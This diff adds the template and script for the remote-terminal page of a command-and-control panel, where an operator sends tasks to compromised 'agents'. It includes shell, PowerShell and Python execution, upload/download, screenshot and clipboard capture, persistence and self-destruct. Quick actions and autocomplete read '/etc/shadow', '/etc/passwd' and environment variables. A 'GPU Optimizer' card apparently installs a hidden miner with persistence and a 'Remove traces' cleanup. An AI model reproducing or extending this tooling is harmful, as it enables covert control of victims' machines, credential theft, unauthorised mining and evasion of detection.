@@ -1,0 +1,650 @@
+{% extends "base.html" %}
+{% block title %}Console — {{ agent.hostname or agent.id[:8] }}{% endblock %}
+{% block page_title %}
+  <span style="font-family:var(--font-mono);font-size:13px;color:var(--text-dim)">console</span>
+  <span style="color:var(--border-light);margin:0 6px">/</span>
+  <span style="color:var(--text-bright)">{{ agent.hostname or agent.id[:8] }}</span>
+{% endblock %}
+
+{% block head %}
+<style>
+  .console-layout {
+    display: grid;
+    grid-template-columns: 1fr 260px;
+    gap: 16px;
+    height: calc(100vh - 100px);
+  }
+  .terminal-card {
+    display: flex;
+    flex-direction: column;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-lg);
+    overflow: hidden;
+    transition: border-color 0.3s ease;
+  }
+  .terminal-card:focus-within { border-color: var(--accent-dim); box-shadow: 0 0 0 1px rgba(0,212,255,0.1); }
+  .terminal-titlebar {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 16px;
+    background: rgba(0,0,0,0.25);
+    border-bottom: 1px solid var(--border);
+    flex-shrink: 0;
+    user-select: none;
+  }
+  .terminal-body {
+    flex: 1;
+    overflow-y: auto;
+    padding: 14px 16px;
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    line-height: 1.8;
+    background: #000d18;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: #7090b0;
+    scroll-behavior: smooth;
+    background-image: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.04) 2px, rgba(0,0,0,0.04) 4px);
+  }
+  .terminal-body .prompt { color: var(--accent); font-weight: 600; }
+  .terminal-body .output { color: #8ab4d0; }
+  .terminal-body .error  { color: var(--red); }
+  .terminal-body .info   { color: var(--yellow); opacity: 0.8; }
+  .terminal-body .success{ color: var(--green); }
+  .terminal-body .cmd-line {
+    display: block;
+    border-left: 2px solid rgba(0,212,255,0.2);
+    padding-left: 8px;
+    margin: 2px 0;
+    animation: fadeIn 0.2s ease;
+  }
+  .terminal-body .result-block {
+    display: block;
+    background: rgba(0,0,0,0.3);
+    border-radius: 4px;
+    padding: 6px 10px;
+    margin: 4px 0 8px;
+    border-left: 2px solid rgba(0,245,155,0.2);
+    animation: fadeIn 0.25s ease;
+  }
+  .terminal-input-row {
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    border-top: 1px solid var(--border);
+    background: rgba(0,0,0,0.2);
+    flex-shrink: 0;
+    transition: background 0.2s ease;
+  }
+  .terminal-input-row:focus-within { background: rgba(0,212,255,0.03); }
+  .terminal-prompt-label {
+    font-family: var(--font-mono);
+    font-size: 12.5px;
+    font-weight: 600;
+    color: var(--accent);
+    white-space: nowrap;
+    padding: 10px 10px 10px 0;
+    border-right: 1px solid var(--border);
+    margin-right: 12px;
+    flex-shrink: 0;
+    text-shadow: 0 0 10px rgba(0,212,255,0.4);
+  }
+  .terminal-input {
+    flex: 1;
+    background: transparent !important;
+    border: none !important;
+    outline: none;
+    color: var(--text-bright) !important;
+    font-family: var(--font-mono) !important;
+    font-size: 12.5px;
+    padding: 10px 0;
+    caret-color: var(--accent);
+    box-shadow: none !important;
+  }
+
+  /* Autocomplete dropdown */
+  .cmd-autocomplete {
+    position: absolute; bottom: 100%; left: 0; right: 0;
+    background: var(--bg-card); border: 1px solid var(--border);
+    border-radius: 8px 8px 0 0; overflow: hidden;
+    max-height: 180px; overflow-y: auto;
+    z-index: 50; display: none;
+    box-shadow: 0 -8px 24px rgba(0,0,0,0.4);
+  }
+  .cmd-autocomplete.visible { display: block; }
+  .ac-item {
+    padding: 6px 14px; font-family: var(--font-mono); font-size: 11.5px;
+    color: var(--text-dim); cursor: pointer; transition: all 0.1s;
+    display: flex; align-items: center; gap: 10px;
+  }
+  .ac-item:hover, .ac-item.selected {
+    background: var(--accent-glow); color: var(--accent);
+  }
+  .ac-item .ac-desc { font-size: 10px; color: var(--text-muted); margin-left: auto; }
+
+  /* Copy button on result blocks */
+  .result-block { position: relative; }
+  .result-copy-btn {
+    position: absolute; top: 4px; right: 6px;
+    padding: 2px 7px; font-size: 9px; border-radius: 4px;
+    background: var(--bg-card); border: 1px solid var(--border);
+    color: var(--text-dim); cursor: pointer; opacity: 0;
+    transition: opacity 0.2s;
+  }
+  .result-block:hover .result-copy-btn { opacity: 1; }
+  .result-copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .terminal-type-select {
+    background: transparent !important;
+    border: none !important;
+    outline: none;
+    color: var(--text-muted) !important;
+    font-family: var(--font-mono) !important;
+    font-size: 10px;
+    padding: 0 4px;
+    width: auto !important;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+  .sidebar-cards { display: flex; flex-direction: column; gap: 12px; overflow-y: auto; }
+  .sidebar-cards .card { margin-bottom: 0; }
+  .card h2.small { font-size: 10px; letter-spacing: 1px; color: var(--text-muted); }
+  .info-table td { padding: 5px 8px; font-size: 11.5px; border-bottom: 1px solid rgba(22,32,56,0.4); }
+  .info-table td:first-child { color: var(--text-dim); width: 80px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .info-table tr:last-child td { border-bottom: none; }
+  .quick-btn {
+    background: var(--bg-input);
+    border: 1px solid var(--border);
+    border-radius: 5px;
+    color: var(--text-dim);
+    font-size: 10px;
+    font-family: var(--font-mono);
+    padding: 4px 8px;
+    cursor: pointer;
+    transition: all 0.18s ease;
+    text-align: left;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .quick-btn:hover {
+    background: var(--accent-glow);
+    border-color: var(--accent-dim);
+    color: var(--accent);
+  }
+  .quick-btn.danger:hover {
+    background: var(--red-glow);
+    border-color: rgba(255,61,90,0.3);
+    color: var(--red);
+  }
+  .quick-btn.primary {
+    border-color: rgba(0,212,255,0.25);
+    color: var(--accent);
+    background: var(--accent-glow);
+  }
+  .quick-btn.primary:hover {
+    background: rgba(0,212,255,0.2);
+    border-color: var(--accent);
+    box-shadow: 0 2px 10px rgba(0,212,255,0.2);
+  }
+  .status-badge-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 2px 9px;
+    border-radius: 20px;
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    font-family: var(--font-mono);
+  }
+</style>
+{% endblock %}
+
+{% block topbar_actions %}
+<div style="display:flex;align-items:center;gap:8px">
+  <span class="badge os-{{ (agent.os or 'unknown').split()[0]|lower }}">{{ agent.os or '?' }}</span>
+  <span class="badge type">{{ agent.platform_type or 'machine' }}</span>
+  {% if agent.is_alive %}
+    <span class="status-badge-pill" style="background:rgba(0,245,155,0.1);border:1px solid rgba(0,245,155,0.3);color:var(--green)">
+      <span style="width:6px;height:6px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite;box-shadow:0 0 6px var(--green)"></span>
+      ONLINE
+    </span>
+  {% else %}
+    <span class="status-badge-pill" style="background:rgba(255,61,90,0.1);border:1px solid rgba(255,61,90,0.25);color:var(--red)">
+      <span style="width:6px;height:6px;background:var(--red);border-radius:50%;opacity:0.6"></span>
+      OFFLINE
+    </span>
+  {% endif %}
+  <a href="/devices" class="btn sm" title="Back to devices">← Devices</a>
+</div>
+{% endblock %}
+
+{% block content %}
+<div class="console-layout">
+
+  <!-- LEFT: Terminal -->
+  <div class="terminal-card">
+
+    <!-- Title bar -->
+    <div class="terminal-titlebar">
+      <div class="win-chrome">
+        <span class="win-dot red"   title="Close"   onclick="if(confirm('Kill agent?'))sendKill()"></span>
+        <span class="win-dot yellow" title="Clear"  onclick="clearConsole()"></span>
+        <span class="win-dot green"  title="Reload" onclick="location.reload()"></span>
+      </div>
+      <div style="flex:1;display:flex;align-items:center;justify-content:center;gap:8px">
+        <span style="font-family:var(--font-mono);font-size:11px;color:var(--text-dim)">
+          {{ agent.hostname or agent.id[:8] }}@c2
+          <span style="color:var(--text-muted);margin:0 4px">—</span>
+          bash
+        </span>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px">
+        <select id="taskType" class="terminal-type-select">
+          <option value="cmd">bash</option>
+          <option value="powershell">powershell</option>
+          <option value="python">python</option>
+          <option value="sysinfo">sysinfo</option>
+          <option value="upload">upload</option>
+          <option value="download">download</option>
+          <option value="screenshot">screenshot</option>
+          <option value="clipboard">clipboard</option>
+          <option value="persist">persist</option>
+          <option value="kill">kill</option>
+        </select>
+        <div style="width:1px;height:14px;background:var(--border)"></div>
+        <button class="btn sm ghost" onclick="clearConsole()" style="padding:2px 8px;font-size:10px">Clear</button>
+      </div>
+    </div>
+
+    <!-- Output -->
+    <div class="terminal-body" id="consoleOutput"><span class="info">╔══════════════════════════════════════════════╗
+║         C2:PANEL — REMOTE TERMINAL           ║
+╚══════════════════════════════════════════════╝
+</span><span class="info">  Session : {{ agent.id }}</span>
+<span class="info">  Host    : {{ agent.hostname }} ({{ agent.username }})</span>
+<span class="info">  OS      : {{ agent.os }} {{ agent.arch }}</span>
+<span class="info">  Ext IP  : {{ agent.ip_external }}</span>
+<span class="info">  Int IP  : {{ agent.ip_internal }}</span>
+<span class="info">  Sleep   : {{ agent.sleep_interval }}s ±{{ agent.jitter }}%</span>
+<span class="info">──────────────────────────────────────────────
+</span>
+{% for t in tasks|reverse %}
+<span class="cmd-line"><span class="prompt">{{ agent.hostname }}$</span> <span style="color:var(--text-dim);font-size:10px">[{{ t.task_type }}]</span> <span class="output">{{ t.payload }}</span></span>
+{% if t.status == 'completed' %}<span class="result-block">{{ t.result }}</span>
+{% elif t.status == 'sent' %}<span class="info">  ↳ awaiting result…</span>
+{% else %}<span class="info">  ↳ queued</span>
+{% endif %}
+{% endfor %}</div>
+
+    <!-- Input row -->
+    <div class="terminal-input-row" style="position:relative">
+      <div class="cmd-autocomplete" id="cmdAutocomplete"></div>
+      <span class="terminal-prompt-label">{{ agent.hostname or '?' }}$</span>
+      <input type="text" id="cmdInput" class="terminal-input" placeholder="Enter command… (↑↓ history, Enter to execute)" autofocus>
+      <button class="btn sm primary" onclick="execFromBtn()" style="padding:4px 12px;font-size:11px;flex-shrink:0;margin-left:8px">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="width:11px;height:11px"><polygon points="5 3 19 12 5 21 5 3"/></svg>
+      </button>
+    </div>
+
+    <!-- Status bar -->
+    <div class="console-status-bar">
+      <span class="csb-item">
+        <span style="width:6px;height:6px;border-radius:50%;background:{% if agent.is_alive %}var(--green){% else %}var(--red){% endif %};box-shadow:0 0 6px {% if agent.is_alive %}var(--green){% else %}var(--red){% endif %};display:inline-block"></span>
+        {{ 'online' if agent.is_alive else 'offline' }}
+      </span>
+      <span class="csb-item accent">{{ agent.group_name or 'default' }}</span>
+      <span class="csb-item">{{ agent.platform_type or 'machine' }}</span>
+      <span class="csb-item">last seen: {{ agent.last_seen or '—' }}</span>
+      <span class="csb-item" id="taskCountLabel" style="color:var(--text-muted)">{{ tasks|length }} tasks</span>
+      <span style="margin-left:auto" class="csb-item" id="taskStatusLabel">ready</span>
+    </div>
+  </div>
+
+  <!-- RIGHT: Sidebar -->
+  <div class="sidebar-cards">
+
+    <!-- Agent info -->
+    <div class="card" style="padding:0;overflow:hidden">
+      <div style="padding:10px 14px;background:rgba(0,0,0,0.2);border-bottom:1px solid var(--border)">
+        <h2 class="small" style="margin:0;padding:0;border:0">Agent Info</h2>
+      </div>
+      <table class="info-table" style="width:100%">
+        <tr><td>ID</td><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-dim);word-break:break-all">{{ agent.id[:16] }}…</td></tr>
+        <tr><td>Host</td><td style="font-weight:600;color:var(--text-bright)">{{ agent.hostname }}</td></tr>
+        <tr><td>User</td><td>{{ agent.username or '—' }}</td></tr>
+        <tr><td>OS</td><td>{{ agent.os or '—' }}</td></tr>
+        <tr><td>Arch</td><td style="font-family:var(--font-mono);font-size:10px">{{ agent.arch or '—' }}</td></tr>
+        <tr><td>Ext IP</td><td style="font-family:var(--font-mono);color:var(--accent)">{{ agent.ip_external or '—' }}</td></tr>
+        <tr><td>Int IP</td><td style="font-family:var(--font-mono);color:var(--text-dim)">{{ agent.ip_internal or '—' }}</td></tr>
+        <tr><td>Group</td><td><span class="badge type" style="font-size:9px">{{ agent.group_name or 'default' }}</span></td></tr>
+        <tr><td>First</td><td style="color:var(--text-muted);font-size:10px">{{ agent.first_seen or '—' }}</td></tr>
+        <tr><td>Sleep</td><td style="font-family:var(--font-mono);color:var(--text-dim)">{{ agent.sleep_interval }}s ±{{ agent.jitter }}%</td></tr>
+      </table>
+    </div>
+
+    <!-- Quick Actions -->
+    <div class="card">
+      <h2 class="small">Quick Actions</h2>
+      <div class="cmd-grid">
+        <button class="quick-btn" onclick="quickCmd('whoami && id')">whoami</button>
+        <button class="quick-btn" onclick="quickCmd('hostname && uname -a')">sysinfo</button>
+        <button class="quick-btn" onclick="quickCmd('ip a || ipconfig /all')">network</button>
+        <button class="quick-btn" onclick="quickCmd('ps aux | head -20 || tasklist')">processes</button>
+        <button class="quick-btn" onclick="quickCmd('ls -la / || dir C:\\\\')">list root</button>
+        <button class="quick-btn" onclick="quickCmd('env || set')">env vars</button>
+        <button class="quick-btn" onclick="quickCmd('cat /etc/passwd 2>/dev/null || net user')">users</button>
+        <button class="quick-btn" onclick="quickCmd('df -h')">disk</button>
+        <button class="quick-btn" onclick="quickCmd('free -h')">memory</button>
+        <button class="quick-btn" onclick="quickCmd('netstat -an | grep LISTEN')">ports</button>
+        <button class="quick-btn" onclick="quickCmd('nvidia-smi 2>/dev/null || echo no_gpu')">gpu</button>
+        <button class="quick-btn" onclick="quickCmd('curl -s ifconfig.me')">ext-ip</button>
+      </div>
+      <button class="quick-btn danger" style="width:100%;margin-top:6px;text-align:center" onclick="sendKill()">⚠ Self-Destruct</button>
+    </div>
+
+    <!-- GPU Optimizer -->
+    <div class="card">
+      <h2 class="small" style="color:var(--purple)">GPU Optimizer</h2>
+      <div class="cmd-grid">
+        <button class="quick-btn primary" onclick="sendCmd(':start')" title="Install & start">:start</button>
+        <button class="quick-btn" onclick="sendCmd(':status')" title="Check status">:status</button>
+        <button class="quick-btn" onclick="sendCmd(':log')" title="Show log">:log</button>
+        <button class="quick-btn" onclick="sendCmd(':persist')" title="Add persistence">:persist</button>
+        <button class="quick-btn danger" onclick="sendCmd(':stop')" title="Stop optimizer">:stop</button>
+        <button class="quick-btn danger" onclick="sendCmd(':cleanup')" title="Remove traces">:cleanup</button>
+      </div>
+    </div>
+
+    <!-- Shortcuts -->
+    <div class="card">
+      <h2 class="small">Shortcut Commands</h2>
+      <div class="cmd-grid">
+        <button class="quick-btn" onclick="sendCmd(':sysinfo')">:sysinfo</button>
+        <button class="quick-btn" onclick="sendCmd(':id')">:id</button>
+        <button class="quick-btn" onclick="sendCmd(':ps')">:ps</button>
+        <button class="quick-btn" onclick="sendCmd(':net')">:net</button>
+        <button class="quick-btn" onclick="sendCmd(':ports')">:ports</button>
+        <button class="quick-btn" onclick="sendCmd(':env')">:env</button>
+        <button class="quick-btn" onclick="sendCmd(':gpu')">:gpu</button>
+        <button class="quick-btn" onclick="sendCmd(':cwd')">:cwd</button>
+        <button class="quick-btn" onclick="sendCmd(':history')">:history</button>
+        <button class="quick-btn" onclick="sendCmd(':cron')">:cron</button>
+        <button class="quick-btn" onclick="sendCmd(':ssh')">:ssh</button>
+        <button class="quick-btn" onclick="sendCmd(':uptime')">:uptime</button>
+      </div>
+    </div>
+
+    <!-- Notes -->
+    <div class="card">
+      <h2 class="small">Operator Notes</h2>
+      <textarea id="agentNote" rows="4" style="font-size:11px;resize:vertical" placeholder="Notes about this agent…">{{ agent.note or '' }}</textarea>
+      <button class="btn sm" style="margin-top:8px;width:100%" onclick="saveNote()">Save Note</button>
+    </div>
+
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+const AGENT_ID = '{{ agent.id }}';
+const output   = document.getElementById('consoleOutput');
+const input    = document.getElementById('cmdInput');
+const statusLbl = document.getElementById('taskStatusLabel');
+
+output.scrollTop = output.scrollHeight;
+
+const cmdHistory = [];
+let histIdx = -1;
+
+// Autocomplete suggestions
+const AC_SUGGESTIONS = [
+  {cmd: 'whoami', desc: 'current user'},
+  {cmd: 'whoami && id', desc: 'user + groups'},
+  {cmd: 'hostname', desc: 'hostname'},
+  {cmd: 'uname -a', desc: 'kernel info'},
+  {cmd: 'hostname && uname -a', desc: 'sysinfo'},
+  {cmd: 'ip a', desc: 'network interfaces'},
+  {cmd: 'ip a || ipconfig /all', desc: 'network (cross-platform)'},
+  {cmd: 'ps aux | head -20', desc: 'top processes'},
+  {cmd: 'ps aux || tasklist', desc: 'processes (cross-platform)'},
+  {cmd: 'ls -la /', desc: 'list root'},
+  {cmd: 'ls -la /home', desc: 'list home'},
+  {cmd: 'ls -la /tmp', desc: 'list tmp'},
+  {cmd: 'env', desc: 'environment vars'},
+  {cmd: 'cat /etc/passwd', desc: 'users'},
+  {cmd: 'df -h', desc: 'disk usage'},
+  {cmd: 'free -h', desc: 'memory'},
+  {cmd: 'netstat -an | grep LISTEN', desc: 'listening ports'},
+  {cmd: 'nvidia-smi', desc: 'GPU info'},
+  {cmd: 'curl -s ifconfig.me', desc: 'external IP'},
+  {cmd: 'cat /etc/os-release', desc: 'OS info'},
+  {cmd: 'crontab -l', desc: 'cron jobs'},
+  {cmd: 'ss -tlnp', desc: 'open ports'},
+  {cmd: 'find / -perm -4000 2>/dev/null', desc: 'SUID files'},
+  {cmd: 'cat /etc/shadow 2>/dev/null', desc: 'shadow file'},
+  {cmd: ':sysinfo', desc: 'shortcut: full sysinfo'},
+  {cmd: ':id', desc: 'shortcut: identity'},
+  {cmd: ':ps', desc: 'shortcut: processes'},
+  {cmd: ':net', desc: 'shortcut: network'},
+  {cmd: ':gpu', desc: 'shortcut: GPU info'},
+  {cmd: ':start', desc: 'start optimizer'},
+  {cmd: ':status', desc: 'optimizer status'},
+  {cmd: ':stop', desc: 'stop optimizer'},
+];
+
+let acIdx = -1;
+const acEl = document.getElementById('cmdAutocomplete');
+
+function showAutocomplete(q) {
+  if (!q || q.length < 2) { hideAutocomplete(); return; }
+  const matches = AC_SUGGESTIONS.filter(s => s.cmd.startsWith(q) || s.cmd.includes(q)).slice(0, 8);
+  if (!matches.length) { hideAutocomplete(); return; }
+  acEl.innerHTML = matches.map((s, i) =>
+    `<div class="ac-item" data-cmd="${s.cmd}" onclick="selectAC('${s.cmd.replace(/'/g,"\\'")}')"><span>${s.cmd}</span><span class="ac-desc">${s.desc}</span></div>`
+  ).join('');
+  acEl.classList.add('visible');
+  acIdx = -1;
+}
+function hideAutocomplete() { acEl.classList.remove('visible'); acIdx = -1; }
+function selectAC(cmd) { input.value = cmd; hideAutocomplete(); input.focus(); }
+
+input.addEventListener('input', () => showAutocomplete(input.value.trim()));
+input.addEventListener('blur', () => setTimeout(hideAutocomplete, 150));
+
+input.addEventListener('keydown', e => {
+  if (acEl.classList.contains('visible')) {
+    const items = acEl.querySelectorAll('.ac-item');
+    if (e.key === 'ArrowDown') {
+      e.preventDefault();
+      acIdx = Math.min(acIdx + 1, items.length - 1);
+      items.forEach((el, i) => el.classList.toggle('selected', i === acIdx));
+      if (items[acIdx]) input.value = items[acIdx].dataset.cmd;
+      return;
+    }
+    if (e.key === 'ArrowUp' && acIdx >= 0) {
+      e.preventDefault();
+      acIdx = Math.max(acIdx - 1, -1);
+      items.forEach((el, i) => el.classList.toggle('selected', i === acIdx));
+      if (acIdx >= 0 && items[acIdx]) input.value = items[acIdx].dataset.cmd;
+      return;
+    }
+    if (e.key === 'Tab') { e.preventDefault(); if (acIdx >= 0 && items[acIdx]) selectAC(items[acIdx].dataset.cmd); else if (items[0]) selectAC(items[0].dataset.cmd); return; }
+    if (e.key === 'Escape') { hideAutocomplete(); return; }
+  }
+  if (e.key === 'Enter' && input.value.trim()) {
+    const cmd = input.value.trim();
+    cmdHistory.unshift(cmd);
+    histIdx = -1;
+    hideAutocomplete();
+    sendCmd(cmd);
+    input.value = '';
+  } else if (e.key === 'ArrowUp' && !acEl.classList.contains('visible')) {
+    e.preventDefault();
+    if (histIdx < cmdHistory.length - 1) { histIdx++; input.value = cmdHistory[histIdx]; }
+  } else if (e.key === 'ArrowDown' && !acEl.classList.contains('visible')) {
+    e.preventDefault();
+    if (histIdx > 0) { histIdx--; input.value = cmdHistory[histIdx]; }
+    else if (histIdx === 0) { histIdx = -1; input.value = ''; }
+  }
+});
+
+function execFromBtn() {
+  if (input.value.trim()) {
+    const cmd = input.value.trim();
+    cmdHistory.unshift(cmd);
+    histIdx = -1;
+    sendCmd(cmd);
+    input.value = '';
+  }
+  input.focus();
+}
+
+function sendCmd(cmd) {
+  const type = document.getElementById('taskType').value;
+  appendLine(`<span class="cmd-line"><span class="prompt">{{ agent.hostname }}$</span> <span style="color:var(--text-dim);font-size:10px">[${type}]</span> <span class="output">${escapeHtml(cmd)}</span></span>`);
+  if (statusLbl) { statusLbl.textContent = 'sending…'; statusLbl.style.color = 'var(--yellow)'; }
+
+  fetch('/api/task/create', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ agent_id: AGENT_ID, type, payload: cmd })
+  }).then(r => r.json()).then(d => {
+    appendLine(`<span class="info">  ↳ task <span style="color:var(--accent)">${(d.task_id||'').slice(0,8)}</span> queued</span>`);
+    if (statusLbl) { statusLbl.textContent = 'queued'; statusLbl.style.color = 'var(--accent)'; }
+    setTimeout(() => { if (statusLbl) { statusLbl.textContent = 'ready'; statusLbl.style.color = ''; } }, 3000);
+  }).catch(err => {
+    appendLine(`<span class="error">  ✕ Error: ${escapeHtml(err.message)}</span>`);
+    if (statusLbl) { statusLbl.textContent = 'error'; statusLbl.style.color = 'var(--red)'; }
+  });
+}
+
+function quickCmd(cmd) { sendCmd(cmd); input.focus(); }
+
+function sendKill() {
+  if (!confirm('KILL this agent? It will self-destruct and remove persistence.')) return;
+  const saved = document.getElementById('taskType').value;
+  document.getElementById('taskType').value = 'kill';
+  sendCmd('self-destruct');
+  document.getElementById('taskType').value = saved;
+}
+
+socket.on('task_result', data => {
+  if (data.agent_id && data.agent_id !== AGENT_ID) return;
+  appendLine(`<span class="result-block"><span class="success">▶ result</span>\n${escapeHtml(data.result || '')}</span>`);
+  if (statusLbl) { statusLbl.textContent = 'received'; statusLbl.style.color = 'var(--green)'; }
+  // Update task count
+  const countLbl = document.getElementById('taskCountLabel');
+  if (countLbl) {
+    const cur = parseInt(countLbl.textContent) || 0;
+    countLbl.textContent = (cur + 1) + ' tasks';
+  }
+  setTimeout(() => { if (statusLbl) { statusLbl.textContent = 'ready'; statusLbl.style.color = ''; } }, 3000);
+});
+
+function appendLine(html) {
+  output.innerHTML += '\n' + html;
+  // Add copy buttons to new result blocks
+  output.querySelectorAll('.result-block:not([data-copy])').forEach(block => {
+    block.dataset.copy = '1';
+    const btn = document.createElement('button');
+    btn.className = 'result-copy-btn';
+    btn.textContent = 'copy';
+    btn.onclick = () => {
+      navigator.clipboard.writeText(block.textContent.replace('copy','').trim());
+      btn.textContent = '✓';
+      setTimeout(() => btn.textContent = 'copy', 1500);
+    };
+    block.appendChild(btn);
+  });
+  output.scrollTop = output.scrollHeight;
+}
+
+function clearConsole() {
+  output.innerHTML = '<span class="info">  Console cleared — ' + new Date().toLocaleTimeString() + '</span>';
+}
+
+function escapeHtml(t) {
+  if (!t) return '';
+  return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function saveNote() {
+  fetch(`/api/agent/${AGENT_ID}/update`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ note: document.getElementById('agentNote').value })
+  }).then(() => showNotification('Note saved', 'green'));
+}
+
+// Global keyboard shortcuts for console
+document.addEventListener('keydown', e => {
+  // Ctrl+L = clear
+  if ((e.ctrlKey || e.metaKey) && e.key === 'l') { e.preventDefault(); clearConsole(); }
+  // Ctrl+K = focus input (override command palette only when input focused)
+  if (e.key === 'Escape' && document.activeElement !== input) input.focus();
+});
+
+/* Auto-poll for task results with adaptive interval */
+const seenTasks = new Set();
+document.querySelectorAll('.result-block, .cmd-line').forEach(el => {
+  const m = el.textContent.match(/\[task ([a-f0-9]+)/);
+  if (m) seenTasks.add(m[1]);
+});
+
+let _pollInterval = 4000;
+let _pollTimer = null;
+let _agentOnline = {{ 'true' if agent.is_alive else 'false' }};
+
+function pollTasks() {
+  fetch(`/api/tasks/${AGENT_ID}`).then(r => r.json()).then(tasks => {
+    const completed = tasks.filter(t => t.status === 'completed');
+    let newResults = 0;
+    completed.forEach(t => {
+      const short = t.id.slice(0,8);
+      if (!seenTasks.has(short)) {
+        seenTasks.add(short);
+        appendLine(`<span class="result-block"><span class="success">▶ result for ${short}</span>\n${escapeHtml(t.result || '(empty)')}</span>`);
+        if (statusLbl) { statusLbl.textContent = 'result received'; statusLbl.style.color = 'var(--green)'; }
+        setTimeout(() => { if (statusLbl) { statusLbl.textContent = 'ready'; statusLbl.style.color = ''; } }, 3000);
+        newResults++;
+      }
+    });
+    // Adaptive polling: faster if pending tasks exist
+    const pending = tasks.filter(t => t.status === 'sent' || t.status === 'pending').length;
+    _pollInterval = pending > 0 ? 2500 : 6000;
+  }).catch(() => { _pollInterval = 8000; });
+  _pollTimer = setTimeout(pollTasks, _pollInterval);
+}
+
+// Live agent status check
+function checkAgentStatus() {
+  fetch(`/api/agent/${AGENT_ID}`).then(r => r.json()).then(a => {
+    const wasOnline = _agentOnline;
+    _agentOnline = a.is_alive;
+    const statusBar = document.querySelector('.console-status-bar .csb-item:first-child');
+    if (statusBar) {
+      const dot = statusBar.querySelector('span');
+      if (dot) {
+        dot.style.background = a.is_alive ? 'var(--green)' : 'var(--red)';
+        dot.style.boxShadow = a.is_alive ? '0 0 6px var(--green)' : '0 0 6px var(--red)';
+      }
+      statusBar.childNodes[statusBar.childNodes.length - 1].textContent = a.is_alive ? ' online' : ' offline';
+    }
+    if (!wasOnline && a.is_alive) {
+      appendLine(`<span class="success">  ● Agent came online</span>`);
+      showNotification('Agent is online', 'green');
+    } else if (wasOnline && !a.is_alive) {
+      appendLine(`<span class="error">  ● Agent went offline</span>`);
+      showNotification('Agent went offline', 'red');
+    }
+  }).catch(() => {});
+}
+
+pollTasks();
+setInterval(checkAgentStatus, 15000);
+</script>
+{% endblock %}
